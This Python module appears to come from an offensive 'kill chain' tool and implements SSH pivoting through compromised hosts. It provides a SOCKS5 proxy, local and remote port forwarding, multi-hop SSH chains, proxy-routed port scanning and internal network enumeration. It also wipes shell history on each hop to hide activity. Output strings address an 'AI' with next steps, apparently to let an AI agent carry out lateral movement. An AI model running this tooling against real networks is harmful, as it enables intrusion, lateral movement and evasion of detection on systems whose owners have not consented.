#!/usr/bin/env python3
"""
Advanced pivoting module for the OCTOPUS kill chain.

Provides SSH-based pivoting capabilities including SOCKS proxies,
local/remote port forwarding, multi-hop tunnel chains, proxy-aware
scanning, and internal network discovery.

All SSH operations use paramiko, following the patterns established
in ``core.killchain.ssh_helpers``.

Usage::

    from core.killchain.pivot import setup_socks_proxy, create_ssh_chain
    result = setup_socks_proxy(ssh_client, local_port=1080)
"""

import logging
import os
import re
import select
import socket
import struct
import subprocess
import threading
import time
from typing import Any, Dict, List, Optional, Tuple

try:
    import paramiko
except ImportError:
    paramiko = None

try:
    from config import CFG
except ImportError:
    CFG = {}

from core.killchain.ssh_helpers import _ssh_connect, _ssh_exec

# ── Logging ──────────────────────────────────────────────────────────────
logger = logging.getLogger("octopus.killchain.pivot")

# ── ANSI Colors ──────────────────────────────────────────────────────────
C_GREEN = "\033[92m"
C_YELLOW = "\033[93m"
C_RED = "\033[91m"
C_CYAN = "\033[96m"
C_GREY = "\033[90m"
C_BLUE = "\033[94m"
C_MAGENTA = "\033[95m"
C_RESET = "\033[0m"

# ── Constants ────────────────────────────────────────────────────────────
DEFAULT_SOCKS_PORT = 1080
SOCKS5_VERSION = 0x05
SOCKS5_AUTH_NONE = 0x00
SOCKS5_CMD_CONNECT = 0x01
SOCKS5_ATYP_IPV4 = 0x01
SOCKS5_ATYP_DOMAIN = 0x03
FORWARD_BUFFER_SIZE = 65536
SCAN_TIMEOUT = 5
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 88, 110, 135, 139, 143, 389,
                443, 445, 464, 636, 993, 995, 1433, 1521, 3306, 3389,
                5432, 5900, 5985, 5986, 8080, 8443, 8888, 9090]

# Active tunnels registry — used for cleanup
_active_tunnels: Dict[str, Dict[str, Any]] = {}


# ═══════════════════════════════════════════════════════════════════════════
# SOCKS5 proxy
# ═══════════════════════════════════════════════════════════════════════════

class _Socks5Handler(threading.Thread):
    """Handle a single SOCKS5 client connection via SSH tunnel."""

    daemon = True

    def __init__(self, client_sock: socket.socket,
                 ssh_transport: "paramiko.Transport") -> None:
        super().__init__()
        self._client = client_sock
        self._transport = ssh_transport

    def run(self) -> None:
        try:
            self._handle()
        except Exception as exc:
            logger.debug("SOCKS5 handler error: %s", exc)
        finally:
            self._client.close()

    def _handle(self) -> None:
        # ── Greeting ──────────────────────────────────────────────
        header = self._client.recv(2)
        if len(header) < 2:
            return
        version, nmethods = struct.unpack("!BB", header)
        if version != SOCKS5_VERSION:
            return
        self._client.recv(nmethods)  # consume method list
        # Reply: no authentication required
        self._client.sendall(struct.pack("!BB", SOCKS5_VERSION, SOCKS5_AUTH_NONE))

        # ── Request ───────────────────────────────────────────────
        request = self._client.recv(4)
        if len(request) < 4:
            return
        ver, cmd, _rsv, atyp = struct.unpack("!BBBB", request)
        if cmd != SOCKS5_CMD_CONNECT:
            self._send_reply(0x07)  # command not supported
            return

        if atyp == SOCKS5_ATYP_IPV4:
            raw_addr = self._client.recv(4)
            remote_host = socket.inet_ntoa(raw_addr)
        elif atyp == SOCKS5_ATYP_DOMAIN:
            domain_len = self._client.recv(1)[0]
            remote_host = self._client.recv(domain_len).decode()
        else:
            self._send_reply(0x08)  # address type not supported
            return

        raw_port = self._client.recv(2)
        remote_port = struct.unpack("!H", raw_port)[0]

        # ── Open channel via SSH ──────────────────────────────────
        try:
            channel = self._transport.open_channel(
                "direct-tcpip",
                (remote_host, remote_port),
                self._client.getpeername(),
                timeout=SCAN_TIMEOUT,
            )
        except Exception as exc:
            logger.debug("SSH channel to %s:%d failed: %s", remote_host, remote_port, exc)
            self._send_reply(0x05)  # connection refused
            return

        # ── Success reply ─────────────────────────────────────────
        self._send_reply(0x00)
        logger.debug("SOCKS5 tunnel: %s:%d", remote_host, remote_port)

        # ── Bidirectional relay ───────────────────────────────────
        self._relay(channel)

    def _send_reply(self, status: int) -> None:
        reply = struct.pack(
            "!BBBBIH", SOCKS5_VERSION, status, 0x00,
            SOCKS5_ATYP_IPV4, 0, 0,
        )
        self._client.sendall(reply)

    def _relay(self, channel: "paramiko.Channel") -> None:
        while True:
            r, _, _ = select.select([self._client, channel], [], [], 10)
            if not r:
                # Check if channel is still alive
                if channel.closed:
                    break
                continue
            if self._client in r:
                data = self._client.recv(FORWARD_BUFFER_SIZE)
                if not data:
                    break
                channel.sendall(data)
            if channel in r:
                data = channel.recv(FORWARD_BUFFER_SIZE)
                if not data:
                    break
                self._client.sendall(data)
        channel.close()


def setup_socks_proxy(
    ssh_client: "paramiko.SSHClient",
    local_port: int = DEFAULT_SOCKS_PORT,
) -> str:
    """Start a SOCKS5 proxy that tunnels traffic through the SSH connection.

    Creates a local SOCKS5 listener that forwards all connections through
    the SSH tunnel.  Tools can use ``proxychains`` or native SOCKS support
    to route traffic through this proxy.

    Args:
        ssh_client: An active paramiko ``SSHClient``.
        local_port: Local port for the SOCKS listener (default 1080).

    Returns:
        Formatted result string with proxy status and usage instructions.
    """
    print(f"\n  {C_CYAN}[PIVOT] Setting up SOCKS5 proxy on 127.0.0.1:{local_port}{C_RESET}")
    output = f"[SOCKS5 PROXY]\n{'═' * 60}\n\n"

    if paramiko is None:
        output += "[!] paramiko not installed — cannot create SOCKS proxy.\n"
        return output

    transport = ssh_client.get_transport()
    if not transport or not transport.is_active():
        output += "[!] SSH transport is not active.\n"
        return output

    # Check if port is already in use
    test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        test_sock.bind(("127.0.0.1", local_port))
    except OSError:
        output += f"[!] Port {local_port} is already in use.\n"
        return output
    finally:
        test_sock.close()

    # ── Start listener thread ─────────────────────────────────────
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server_sock.bind(("127.0.0.1", local_port))
    server_sock.listen(64)
    server_sock.settimeout(1.0)

    stop_event = threading.Event()

    def _accept_loop() -> None:
        while not stop_event.is_set():
            try:
                client_sock, addr = server_sock.accept()
                handler = _Socks5Handler(client_sock, transport)
                handler.start()
            except socket.timeout:
                continue
            except Exception as exc:
                if not stop_event.is_set():
                    logger.error("SOCKS accept error: %s", exc)
                break
        server_sock.close()

    listener = threading.Thread(target=_accept_loop, daemon=True,
                                name=f"socks5-{local_port}")
    listener.start()

    tunnel_id = f"socks5:{local_port}"
    _active_tunnels[tunnel_id] = {
        "type": "socks5",
        "local_port": local_port,
        "server_sock": server_sock,
        "stop_event": stop_event,
        "thread": listener,
    }

    output += f"[+] SOCKS5 proxy listening on 127.0.0.1:{local_port}\n"
    output += f"    Tunnel ID: {tunnel_id}\n\n"
    output += f"  Usage with proxychains:\n"
    output += f"    echo 'socks5 127.0.0.1 {local_port}' >> /etc/proxychains4.conf\n"
    output += f"    proxychains nmap -sT -Pn <internal_target>\n\n"
    output += f"  Usage with curl:\n"
    output += f"    curl --socks5 127.0.0.1:{local_port} http://<internal_target>\n"
    print(f"    {C_GREEN}[+] SOCKS5 proxy active on port {local_port}{C_RESET}")

    return output


# ═══════════════════════════════════════════════════════════════════════════
# Local port forwarding
# ═══════════════════════════════════════════════════════════════════════════

def _forward_handler(
    local_sock: socket.socket,
    channel: "paramiko.Channel",
) -> None:
    """Bidirectional relay between a local socket and an SSH channel."""
    try:
        while True:
            r, _, _ = select.select([local_sock, channel], [], [], 10)
            if not r:
                if channel.closed:
                    break
                continue
            if local_sock in r:
                data = local_sock.recv(FORWARD_BUFFER_SIZE)
                if not data:
                    break
                channel.sendall(data)
            if channel in r:
                data = channel.recv(FORWARD_BUFFER_SIZE)
                if not data:
                    break
                local_sock.sendall(data)
    except Exception as exc:
        logger.debug("Forward handler error: %s", exc)
    finally:
        channel.close()
        local_sock.close()


def setup_local_forward(
    ssh_client: "paramiko.SSHClient",
    local_port: int,
    remote_host: str,
    remote_port: int,
) -> str:
    """Create a local port forward through the SSH connection.

    Connections to ``127.0.0.1:<local_port>`` are forwarded through the
    SSH tunnel to ``<remote_host>:<remote_port>`` as seen from the SSH
    server.

    Args:
        ssh_client: An active paramiko ``SSHClient``.
        local_port: Local port to listen on.
        remote_host: Remote host to forward to (from the SSH server's
                     perspective).
        remote_port: Remote port to forward to.

    Returns:
        Formatted result string with forwarding status.
    """
    print(f"\n  {C_CYAN}[PIVOT] Local forward: 127.0.0.1:{local_port} → {remote_host}:{remote_port}{C_RESET}")
    output = f"[LOCAL PORT FORWARD]\n{'═' * 60}\n\n"

    if paramiko is None:
        output += "[!] paramiko not installed.\n"
        return output

    transport = ssh_client.get_transport()
    if not transport or not transport.is_active():
        output += "[!] SSH transport is not active.\n"
        return output

    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_sock.bind(("127.0.0.1", local_port))
    except OSError as exc:
        output += f"[!] Cannot bind to port {local_port}: {exc}\n"
        return output
    server_sock.listen(16)
    server_sock.settimeout(1.0)

    stop_event = threading.Event()

    def _accept_loop() -> None:
        while not stop_event.is_set():
            try:
                client_sock, _addr = server_sock.accept()
                channel = transport.open_channel(
                    "direct-tcpip",
                    (remote_host, remote_port),
                    client_sock.getpeername(),
                )
                t = threading.Thread(
                    target=_forward_handler, args=(client_sock, channel),
                    daemon=True,
                )
                t.start()
            except socket.timeout:
                continue
            except Exception as exc:
                if not stop_event.is_set():
                    logger.error("Local forward accept error: %s", exc)
                break
        server_sock.close()

    listener = threading.Thread(target=_accept_loop, daemon=True,
                                name=f"fwd-L{local_port}")
    listener.start()

    tunnel_id = f"local:{local_port}->{remote_host}:{remote_port}"
    _active_tunnels[tunnel_id] = {
        "type": "local_forward",
        "local_port": local_port,
        "remote_host": remote_host,
        "remote_port": remote_port,
        "server_sock": server_sock,
        "stop_event": stop_event,
        "thread": listener,
    }

    output += f"[+] Local forward active\n"
    output += f"    127.0.0.1:{local_port} → {remote_host}:{remote_port}\n"
    output += f"    Tunnel ID: {tunnel_id}\n\n"
    output += f"  Access via: nc 127.0.0.1 {local_port}\n"
    print(f"    {C_GREEN}[+] Forward active: :{local_port} → {remote_host}:{remote_port}{C_RESET}")

    return output


# ═══════════════════════════════════════════════════════════════════════════
# Remote port forwarding
# ═══════════════════════════════════════════════════════════════════════════

def setup_remote_forward(
    ssh_client: "paramiko.SSHClient",
    remote_port: int,
    local_host: str,
    local_port: int,
) -> str:
    """Create a remote port forward through the SSH connection.

    The SSH server listens on ``<remote_port>`` and forwards connections
    back to ``<local_host>:<local_port>`` on our machine.  Useful for
    receiving reverse connections from internal hosts.

    Args:
        ssh_client: An active paramiko ``SSHClient``.
        remote_port: Port to listen on the remote SSH server.
        local_host: Local host to forward to.
        local_port: Local port to forward to.

    Returns:
        Formatted result string with forwarding status.
    """
    print(f"\n  {C_CYAN}[PIVOT] Remote forward: remote:{remote_port} → {local_host}:{local_port}{C_RESET}")
    output = f"[REMOTE PORT FORWARD]\n{'═' * 60}\n\n"

    if paramiko is None:
        output += "[!] paramiko not installed.\n"
        return output

    transport = ssh_client.get_transport()
    if not transport or not transport.is_active():
        output += "[!] SSH transport is not active.\n"
        return output

    try:
        transport.request_port_forward("", remote_port)
    except Exception as exc:
        output += f"[!] Remote forward request failed: {exc}\n"
        output += "    The SSH server may not allow remote forwarding (GatewayPorts).\n"
        return output

    stop_event = threading.Event()

    def _reverse_handler() -> None:
        while not stop_event.is_set():
            try:
                channel = transport.accept(timeout=2)
                if channel is None:
                    continue
                local_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                local_sock.connect((local_host, local_port))
                t = threading.Thread(
                    target=_forward_handler, args=(local_sock, channel),
                    daemon=True,
                )
                t.start()
            except Exception as exc:
                if not stop_event.is_set():
                    logger.debug("Reverse forward handler error: %s", exc)
                continue

    handler = threading.Thread(target=_reverse_handler, daemon=True,
                               name=f"fwd-R{remote_port}")
    handler.start()

    tunnel_id = f"remote:{remote_port}->{local_host}:{local_port}"
    _active_tunnels[tunnel_id] = {
        "type": "remote_forward",
        "remote_port": remote_port,
        "local_host": local_host,
        "local_port": local_port,
        "stop_event": stop_event,
        "thread": handler,
    }

    output += f"[+] Remote forward active\n"
    output += f"    Remote :{remote_port} → {local_host}:{local_port}\n"
    output += f"    Tunnel ID: {tunnel_id}\n"
    print(f"    {C_GREEN}[+] Remote forward active: :{remote_port} → {local_host}:{local_port}{C_RESET}")

    return output


# ═══════════════════════════════════════════════════════════════════════════
# Multi-hop SSH tunnel chain
# ═══════════════════════════════════════════════════════════════════════════

def create_ssh_chain(
    hop_list: List[Dict[str, Any]],
) -> Tuple[Optional["paramiko.SSHClient"], str]:
    """Create a multi-hop SSH tunnel chain through a series of hosts.

    Each hop connects through the previous hop's SSH channel, creating
    a chain like: attacker → hop1 → hop2 → … → final target.

    Args:
        hop_list: List of dicts, each with keys ``host``, ``user``,
                  ``password``, and optionally ``port`` (default 22).
                  Example::

                      [
                          {"host": "10.10.10.1", "user": "user1", "password": "pass1"},
                          {"host": "10.10.10.2", "user": "user2", "password": "pass2"},
                      ]

    Returns:
        Tuple of (final ``SSHClient`` or ``None``, formatted result string).
    """
    print(f"\n  {C_MAGENTA}[PIVOT] Creating SSH chain ({len(hop_list)} hops){C_RESET}")
    output = f"[SSH TUNNEL CHAIN — {len(hop_list)} hops]\n{'═' * 60}\n\n"

    if paramiko is None:
        output += "[!] paramiko not installed.\n"
        return None, output

    if not hop_list:
        output += "[!] Empty hop list.\n"
        return None, output

    clients: List["paramiko.SSHClient"] = []
    prev_transport: Optional["paramiko.Transport"] = None

    for idx, hop in enumerate(hop_list):
        host = hop["host"]
        user = hop.get("user", "root")
        password = hop.get("password", "")
        port = hop.get("port", 22)
        hop_label = f"Hop {idx + 1}: {user}@{host}:{port}"

        print(f"    {C_CYAN}[*] {hop_label}...{C_RESET}")

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            if prev_transport is not None:
                # Open a channel through the previous hop
                channel = prev_transport.open_channel(
                    "direct-tcpip", (host, port),
                    ("127.0.0.1", 0),
                )
                client.connect(
                    hostname=host, port=port, username=user,
                    password=password, sock=channel,
                    timeout=15, look_for_keys=False, allow_agent=False,
                    banner_timeout=10, auth_timeout=15,
                )
            else:
                # First hop — direct connection
                client.connect(
                    hostname=host, port=port, username=user,
                    password=password,
                    timeout=15, look_for_keys=False, allow_agent=False,
                    banner_timeout=10, auth_timeout=15,
                )

            # Disable history on the hop
            try:
                _ssh_exec(client, "unset HISTFILE; export HISTFILE=/dev/null", timeout=5)
            except Exception:
                pass

            whoami = _ssh_exec(client, "id; hostname", timeout=5)
            output += f"  [+] {hop_label} — connected\n"
            output += f"      {whoami.splitlines()[0] if whoami else '?'}\n"
            print(f"    {C_GREEN}[+] {hop_label} — OK{C_RESET}")

            clients.append(client)
            prev_transport = client.get_transport()

        except Exception as exc:
            output += f"  [!] {hop_label} — FAILED: {exc}\n"
            logger.error("SSH chain hop %d failed: %s", idx + 1, exc)
            print(f"    {C_RED}[!] {hop_label} — FAILED{C_RESET}")
            # Close all previous clients
            for c in clients:
                try:
                    c.close()
                except Exception:
                    pass
            return None, output

    output += f"\n[+] SSH chain established ({len(clients)} hops)\n"
    output += f"    Final endpoint: {hop_list[-1]['host']}\n"
    output += "    Use the returned SSHClient for commands on the final host.\n"

    return clients[-1], output


# ═══════════════════════════════════════════════════════════════════════════
# Proxy-aware scanning
# ═══════════════════════════════════════════════════════════════════════════

def scan_through_proxy(
    proxy_port: int,
    target: str,
    ports: Optional[List[int]] = None,
    timeout: int = SCAN_TIMEOUT,
) -> str:
    """Scan a target through an active SOCKS5 proxy (TCP connect scan).

    Performs a TCP connect scan by routing connections through the local
    SOCKS5 proxy.  Alternatively falls back to ``proxychains + nmap`` CLI.

    Args:
        proxy_port: Local SOCKS5 proxy port.
        target: Target IP or hostname to scan.
        ports: List of ports to scan (default: common ports).
        timeout: Connection timeout per port in seconds.

    Returns:
        Formatted result string with open port list.
    """
    if ports is None:
        ports = COMMON_PORTS

    print(f"\n  {C_CYAN}[PIVOT] Scanning {target} through SOCKS5 proxy :{proxy_port}{C_RESET}")
    output = f"[PROXY SCAN — {target} via SOCKS5:{proxy_port}]\n{'═' * 60}\n\n"

    open_ports: List[int] = []
    closed_count = 0

    # ── Try native SOCKS5 connect ─────────────────────────────────
    try:
        import socks  # PySocks — lazy import
    except ImportError:
        socks = None  # type: ignore[assignment]

    if socks is not None:
        output += f"  Scanning {len(ports)} ports via PySocks...\n"
        for port in ports:
            try:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", proxy_port)
                s.settimeout(timeout)
                s.connect((target, port))
                s.close()
                open_ports.append(port)
                output += f"    {C_GREEN}{port}/tcp  OPEN{C_RESET}\n"
            except Exception:
                closed_count += 1
    else:
        # Fall back to proxychains + nmap
        nmap_bin = subprocess.which("nmap") if hasattr(subprocess, "which") else None
        proxychains_bin = subprocess.which("proxychains4") or subprocess.which("proxychains") if hasattr(subprocess, "which") else None

        # Use shutil.which as proper fallback
        import shutil as _shutil
        nmap_bin = _shutil.which("nmap")
        proxychains_bin = _shutil.which("proxychains4") or _shutil.which("proxychains")

        if proxychains_bin and nmap_bin:
            port_str = ",".join(str(p) for p in ports)
            cmd = f"{proxychains_bin} -q {nmap_bin} -sT -Pn -p {port_str} {target}"
            output += f"  (via proxychains + nmap)\n"
            try:
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True,
                    timeout=len(ports) * timeout,
                )
                nmap_out = result.stdout
                output += f"{nmap_out[:3000]}\n"
                # Parse open ports from nmap output
                for m in re.finditer(r"(\d+)/tcp\s+open", nmap_out):
                    open_ports.append(int(m.group(1)))
            except subprocess.TimeoutExpired:
                output += "[!] Proxy scan timed out.\n"
            except Exception as exc:
                output += f"[!] Proxy scan error: {exc}\n"
        else:
            # Raw SOCKS5 connect without PySocks
            output += "  [!] PySocks not installed and proxychains not found.\n"
            output += "  Attempting raw SOCKS5 connect...\n"
            for port in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(timeout)
                    s.connect(("127.0.0.1", proxy_port))
                    # SOCKS5 handshake
                    s.sendall(struct.pack("!BBB", 0x05, 0x01, 0x00))
                    resp = s.recv(2)
                    if len(resp) < 2 or resp[1] != 0x00:
                        s.close()
                        continue
                    # Connect request
                    addr_bytes = socket.inet_aton(target)
                    s.sendall(
                        struct.pack("!BBBB", 0x05, 0x01, 0x00, 0x01)
                        + addr_bytes
                        + struct.pack("!H", port)
                    )
                    resp = s.recv(10)
                    if len(resp) >= 2 and resp[1] == 0x00:
                        open_ports.append(port)
                        output += f"    {C_GREEN}{port}/tcp  OPEN{C_RESET}\n"
                    else:
                        closed_count += 1
                    s.close()
                except Exception:
                    closed_count += 1

    output += f"\n{'═' * 60}\n"
    output += f"Open ports: {len(open_ports)} | Closed/filtered: {closed_count}\n"
    if open_ports:
        output += f"Open: {', '.join(str(p) for p in sorted(open_ports))}\n"
    output += "AI: Use local port forwarding to interact with open services.\n"
    return output


# ═══════════════════════════════════════════════════════════════════════════
# Network discovery
# ═══════════════════════════════════════════════════════════════════════════

def get_network_info(ssh_client: "paramiko.SSHClient") -> str:
    """Discover internal networks from a compromised host.

    Runs route, ARP, ifconfig, and other network enumeration commands
    via the SSH connection to map the internal network.

    Args:
        ssh_client: An active paramiko ``SSHClient``.

    Returns:
        Formatted result string with discovered networks, interfaces,
        routes, ARP neighbors, and listening services.
    """
    print(f"\n  {C_CYAN}[PIVOT] Discovering internal networks...{C_RESET}")
    output = f"[NETWORK DISCOVERY]\n{'═' * 60}\n\n"

    # ── Network interfaces ────────────────────────────────────────
    output += "[INTERFACES]\n" + "-" * 40 + "\n"
    iface_cmds = [
        "ip -4 addr show 2>/dev/null",
        "ifconfig 2>/dev/null",
    ]
    for cmd in iface_cmds:
        result = _ssh_exec(ssh_client, cmd, timeout=10)
        if result and "[!]" not in result:
            output += f"{result}\n\n"
            break
    else:
        output += "  [!] Could not enumerate interfaces.\n\n"

    # ── Routes ────────────────────────────────────────────────────
    output += "[ROUTES]\n" + "-" * 40 + "\n"
    route_cmds = [
        "ip route show 2>/dev/null",
        "route -n 2>/dev/null",
        "netstat -rn 2>/dev/null",
    ]
    for cmd in route_cmds:
        result = _ssh_exec(ssh_client, cmd, timeout=10)
        if result and "[!]" not in result:
            output += f"{result}\n\n"
            break
    else:
        output += "  [!] Could not enumerate routes.\n\n"

    # ── ARP table ─────────────────────────────────────────────────
    output += "[ARP TABLE]\n" + "-" * 40 + "\n"
    arp_cmds = [
        "ip neigh show 2>/dev/null",
        "arp -an 2>/dev/null",
    ]
    for cmd in arp_cmds:
        result = _ssh_exec(ssh_client, cmd, timeout=10)
        if result and "[!]" not in result:
            output += f"{result}\n\n"
            break
    else:
        output += "  [!] Could not enumerate ARP table.\n\n"

    # ── DNS ───────────────────────────────────────────────────────
    output += "[DNS CONFIGURATION]\n" + "-" * 40 + "\n"
    dns_result = _ssh_exec(ssh_client, "cat /etc/resolv.conf 2>/dev/null", timeout=5)
    if dns_result and "[!]" not in dns_result:
        output += f"{dns_result}\n\n"

    # ── Listening services ────────────────────────────────────────
    output += "[LISTENING SERVICES]\n" + "-" * 40 + "\n"
    listen_cmds = [
        "ss -tlnp 2>/dev/null",
        "netstat -tlnp 2>/dev/null",
    ]
    for cmd in listen_cmds:
        result = _ssh_exec(ssh_client, cmd, timeout=10)
        if result and "[!]" not in result:
            output += f"{result}\n\n"
            break

    # ── Established connections ───────────────────────────────────
    output += "[ESTABLISHED CONNECTIONS]\n" + "-" * 40 + "\n"
    estab_cmds = [
        "ss -tnp state established 2>/dev/null | head -30",
        "netstat -tnp 2>/dev/null | grep ESTABLISHED | head -30",
    ]
    for cmd in estab_cmds:
        result = _ssh_exec(ssh_client, cmd, timeout=10)
        if result and "[!]" not in result:
            output += f"{result}\n\n"
            break

    # ── Extract discovered subnets ────────────────────────────────
    all_text = output
    discovered_subnets: List[str] = []
    discovered_hosts: List[str] = []

    # Subnets from ip addr / routes
    for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+/\d+)", all_text):
        subnet = m.group(1)
        if subnet not in discovered_subnets and not subnet.startswith("127."):
            discovered_subnets.append(subnet)

    # Hosts from ARP / connections
    for m in re.finditer(r"(\d+\.\d+\.\d+\.\d+)", all_text):
        ip = m.group(1)
        if (ip not in discovered_hosts
                and not ip.startswith("127.")
                and not ip.startswith("0.")
                and ip != "255.255.255.255"):
            discovered_hosts.append(ip)

    output += f"{'═' * 60}\n"
    output += f"[SUMMARY]\n"
    output += f"  Subnets: {', '.join(discovered_subnets) if discovered_subnets else 'none'}\n"
    output += f"  Hosts:   {len(discovered_hosts)} unique IPs discovered\n"
    for ip in sorted(set(discovered_hosts))[:30]:
        output += f"    → {ip}\n"
    output += "\nAI: Use setup_socks_proxy or setup_local_forward to access internal networks.\n"

    return output
